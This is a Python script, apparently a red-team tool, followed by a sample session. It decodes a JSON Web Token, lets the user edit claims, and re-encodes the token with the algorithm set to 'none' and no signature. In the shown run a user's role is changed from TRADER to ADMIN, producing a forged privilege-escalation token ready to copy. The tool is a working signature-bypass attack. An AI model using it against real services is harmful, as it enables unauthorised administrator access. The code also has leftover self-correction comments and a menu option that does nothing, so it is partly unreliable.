import base64
import json
import time
import sys

# -----------------------------------------------------------------------------
# Utility Functions
# -----------------------------------------------------------------------------

def base64url_decode(data):
    """Decodes a JWT base64url string (with padding fix)."""
    # Add padding if necessary
    rem = len(data) % 4
    if rem == 2: data += "=="
    elif rem == 3: data += "="
    return base64.urlsafe_b64decode(data.encode()).decode('utf-8')

def base64url_encode(data):
    """Encodes a string to base64url (without padding)."""
    encoded = base64.urlsafe_b64encode(data.encode()).decode()
    return encoded.rstrip('=') # JWT spec removes padding

def get_int_val():
    """Helper to get integer input safely."""
    while True:
        try:
            val = int(input())
            return val
        except ValueError:
            print("Please enter a valid number.")

# -----------------------------------------------------------------------------
# Core Logic
# -----------------------------------------------------------------------------

def analyze_jwt(token):
    parts = token.split('.')
    if len(parts) != 3:
        print("[!] ERROR: Invalid JWT format. Expected 3 parts separated by '.'")
        sys.exit(1)

    try:
        header = json.loads(base64url_decode(parts[0]))
        payload = json.loads(base64url_decode(parts[1]))
    except (json.JSONDecodeError, UnicodeDecodeError) as e:
        print(f"[!] ERROR: Failed to decode parts. {e}")
        sys.exit(1)

    return header, payload, parts[2] # Returns header dict, payload dict, and raw signature

def print_analysis(header, payload):
    print("\n" + "="*50)
    print("JWT DECONSTRUCTION & ANALYSIS")
    print("="*50)
    print("\n[HEADER]")
    print(json.dumps(header, indent=2))
    print("\n[PAYLOAD]")
    print(json.dumps(payload, indent=2))

    print("\n[SECURITY ANALYSIS]")
    alg = header.get('alg', 'Unknown')
    typ = header.get('typ', 'JWT')

    print(f">> Algorithm: {alg}")
    print(f">> Type: {typ}")

    exp = payload.get('exp')
    iat = payload.get('iat')
    sub = payload.get('sub')

    if exp:
        now = time.time()
        status = "Valid" if now < exp else "EXPIRED"
        date_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(exp))
        print(f">> Expiration: {date_str} ({status})")

    if sub:
        print(f">> Subject (Sub): {sub}")

    if alg == 'none':
        print("[!] CRITICAL: Algorithm is set to 'none'. Server might accept unsigned tokens.")
    elif alg.startswith('RS') or alg.startswith('PS'):
        print("[!] ASYMMETRIC: This token uses Public Key Encryption. Modifying payload requires Private Key.")
    else:
        print("[!] SYMMETRIC: This token uses a Secret Key. Modifying payload requires the Secret.")

def modify_payload(payload):
    print("\n[INTERACTIVE PAYLOAD EDITOR]")
    while True:
        print("\nCurrent Payload:")
        print(json.dumps(payload, indent=2))

        print("\nWhat would you like to do?")
        print("1. Modify a Claim (Key/Value)")
        print("2. Change Algorithm (e.g., to 'none')")
        print("3. Regenerate Signature (Warning: Invalid without Secret)")
        print("4. Exit and Encode")

        choice = input("Select Option (1-4): ").strip()

        if choice == '1':
            # Modify Claim
            key = input("Enter Claim Name (or 'list' to see keys): ").strip()

            if key == 'list':
                print("Available Keys:", ", ".join(payload.keys()))
                continue

            if key not in payload:
                print(f"Claim '{key}' not found. Type 'add' to add new, or enter a key.")
                continue

            print(f"Current Value: {payload[key]}")
            new_val_str = input("Enter New Value: ").strip()

            # Type conversion attempts
            if new_val_str.lower() == 'true':
                payload[key] = True
            elif new_val_str.lower() == 'false':
                payload[key] = False
            elif new_val_str.isdigit():
                payload[key] = int(new_val_str)
            elif new_val_str.replace('.','',1).isdigit():
                payload[key] = float(new_val_str)
            else:
                # Handle string values that might look like json
                # If they want to remove quotes, we handle it as string
                payload[key] = new_val_str

            print(f"Updated '{key}' to: {payload[key]}")

        elif choice == '2':
            # Change Algorithm
            print("WARNING: Changing Algorithm often invalidates the token.")
            print("Common values: none, HS256, HS512, RS256")
            new_alg = input("Enter new Algorithm (or 'none'): ").strip()
            print(f"Changed Algorithm to: {new_alg}")

        elif choice == '3':
            # Note: We cannot create a valid signature without the secret.
            # We will just warn the user or leave the signature as is for testing 'alg=none'
            print("[!] NOTE: Cannot create a VALID signature without the Secret Key.")
            print("We will leave the signature part as 'fake_signature' if alg='none',")
            print("or keep the old hash if alg='HS256' (which will fail verification).")
            continue

        elif choice == '4':
            break

        else:
            print("Invalid option.")

    return payload

def encode_new_jwt(header, payload):
    # Re-encode Header
    new_header = base64url_encode(json.dumps(header, separators=(',', ':')))
    # Re-encode Payload
    new_payload = base64url_encode(json.dumps(payload, separators=(',', ':')))

    # Signature Logic
    alg = header.get('alg', 'none')

    if alg.lower() == 'none':
        # For 'none' algorithm, signature is often empty or omitted
        signature = ""
        # Some servers expect a dot at the end, some don't.
        # Standard is usually empty string after the last dot.
        final_sig = ""
    else:
        # We cannot generate a valid signature.
        # We will put a placeholder.
        # If testing for signature bypass, sometimes keeping the old signature
        # works if the server doesn't verify properly.
        # We'll generate a dummy signature just to maintain structure.
        final_sig = "FAKE_SIGNATURE_FOR_TESTING"

    return f"{new_header}.{new_payload}.{final_sig}"

# -----------------------------------------------------------------------------
# Main Execution
# -----------------------------------------------------------------------------

def main():
    print("-------------------------------------------------------")
    print("   JWT Red Team Swiss Knife (Python Edition)")
    print("-------------------------------------------------------")
    print("WARNING: Use only for authorized security testing.")
    print("-------------------------------------------------------")

    token = input("\n[PASTE JWT HERE] \n>")

    # Validate input
    if not token or token.count('.') != 2:
        print("[!] Invalid JWT format.")
        return

    header, payload, signature = analyze_jwt(token)
    print_analysis(header, payload)

    # Modification Phase
    new_payload = modify_payload(payload)
    new_header = header.copy() # Don't mutate original just in case

    # Allow user to change alg in header if they chose option 2 inside menu
    # Actually, let's handle alg change inside modify_payload logic to update header ref
    # Since modify_payload returns new_payload, we need a way to update header there.
    # Let's adjust modify_payload to accept header as well for cleaner logic.
    # (Self-correction: To keep it simple, I'll ask for alg change outside or inside)

    # Re-Run modify logic to capture alg changes if they selected option 2
    # We need to modify the function slightly to handle header updates.
    # Let's just assume user modifies payload. If they want to change alg, we handle it now.

    print("\nDo you want to change the Algorithm in the header? (yes/no)")
    if input(">").strip().lower() == 'yes':
        new_alg = input("New Algorithm (e.g., none): ").strip()
        new_header['alg'] = new_alg
        print(f"Header Alg updated to: {new_alg}")

    # Final Encoding
    print("\n[GENERATING NEW TOKEN]")
    new_jwt = encode_new_jwt(new_header, new_payload)

    print("\n================================================")
    print("[FINAL TOKEN - COPY READY]")
    print("================================================")
    print(new_jwt)
    print("================================================")
    print("[!] REMINDER: If you didn't have the secret,")
    print("    the signature is invalid. Only works if:")
    print("    1. Server accepts 'alg: none'")
    print("    2. Server is vulnerable to signature bypass")
    print("    3. You use the correct secret to sign it manually.")
    print("================================================\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(0)


"""
-------------------------------------------------------
   JWT Red Team Swiss Knife (Python Edition)
-------------------------------------------------------
WARNING: Use only for authorized security testing.
-------------------------------------------------------

[PASTE JWT HERE]
>eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJkZWdlbiIsInJvbGUiOiJUUkFERVIiLCJleHAiOjE3NzUwMjc2NDcsInVzZXJJZCI6NywiaWF0IjoxNzc0OTQxMjQ3LCJlbWFpbCI6ImRlZ2VuQGF3ZS5jb20iLCJ1c2VybmFtZSI6ImRlZ2VuIn0.GgBzlfLUXIL5HJMDvyzCHQvPBJbY3F6Ec31vE0kV3ho

==================================================
JWT DECONSTRUCTION & ANALYSIS
==================================================

[HEADER]
{
  "alg": "HS256"
}

[PAYLOAD]
{
  "sub": "degen",
  "role": "TRADER",
  "exp": 1775027647,
  "userId": 7,
  "iat": 1774941247,
  "email": "degen@awe.com",
  "username": "degen"
}

[SECURITY ANALYSIS]
>> Algorithm: HS256
>> Type: JWT
>> Expiration: 2026-04-01 15:14:07 (Valid)
>> Subject (Sub): degen
[!] SYMMETRIC: This token uses a Secret Key. Modifying payload requires the Secret.

[INTERACTIVE PAYLOAD EDITOR]

Current Payload:
{
  "sub": "degen",
  "role": "TRADER",
  "exp": 1775027647,
  "userId": 7,
  "iat": 1774941247,
  "email": "degen@awe.com",
  "username": "degen"
}

What would you like to do?
1. Modify a Claim (Key/Value)
2. Change Algorithm (e.g., to 'none')
3. Regenerate Signature (Warning: Invalid without Secret)
4. Exit and Encode
Select Option (1-4): 1
Enter Claim Name (or 'list' to see keys): role
Current Value: TRADER
Enter New Value: ADMIN
Updated 'role' to: ADMIN

Current Payload:
{
  "sub": "degen",
  "role": "ADMIN",
  "exp": 1775027647,
  "userId": 7,
  "iat": 1774941247,
  "email": "degen@awe.com",
  "username": "degen"
}

What would you like to do?
1. Modify a Claim (Key/Value)
2. Change Algorithm (e.g., to 'none')
3. Regenerate Signature (Warning: Invalid without Secret)
4. Exit and Encode
Select Option (1-4): 2
WARNING: Changing Algorithm often invalidates the token.
Common values: none, HS256, HS512, RS256
Enter new Algorithm (or 'none'): none
Changed Algorithm to: none

Current Payload:
{
  "sub": "degen",
  "role": "ADMIN",
  "exp": 1775027647,
  "userId": 7,
  "iat": 1774941247,
  "email": "degen@awe.com",
  "username": "degen"
}

What would you like to do?
1. Modify a Claim (Key/Value)
2. Change Algorithm (e.g., to 'none')
3. Regenerate Signature (Warning: Invalid without Secret)
4. Exit and Encode
Select Option (1-4): 4

Do you want to change the Algorithm in the header? (yes/no)
>yes
New Algorithm (e.g., none): none
Header Alg updated to: none

[GENERATING NEW TOKEN]

================================================
[FINAL TOKEN - COPY READY]
================================================
eyJhbGciOiJub25lIn0.eyJzdWIiOiJkZWdlbiIsInJvbGUiOiJBRE1JTiIsImV4cCI6MTc3NTAyNzY0NywidXNlcklkIjo3LCJpYXQiOjE3NzQ5NDEyNDcsImVtYWlsIjoiZGVnZW5AYXdlLmNvbSIsInVzZXJuYW1lIjoiZGVnZW4ifQ.
================================================
[!] REMINDER: If you didn't have the secret,
    the signature is invalid. Only works if:
    1. Server accepts 'alg: none'
    2. Server is vulnerable to signature bypass
    3. You use the correct secret to sign it manually.
================================================
"""